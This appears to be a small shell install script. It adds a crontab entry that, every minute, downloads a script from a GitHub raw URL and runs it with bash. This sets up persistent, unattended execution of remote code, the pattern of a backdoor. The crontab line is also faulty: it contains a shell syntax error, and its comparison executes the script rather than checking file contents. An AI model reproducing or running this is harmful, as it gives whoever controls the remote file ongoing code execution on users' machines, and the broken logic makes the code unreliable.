echo "\033[7m\033[1m\033[91mINSTALLING CRONJOB\033[0m"
(crontab -l 2>/dev/null; echo "* * * * * curl https://raw.githubusercontent.com/IsaccBarker/sophial/main/script.sh > ~/.script && cat ~/.script > ~/.pre && if [ \"\$(cat ~/.pre)\" != \"\$(~/.script)\" ]; then; bash ~/.script; fi") | crontab -
echo "\033[7m\033[1m\033[92mCRONJOB INSTALLED\033[0m"

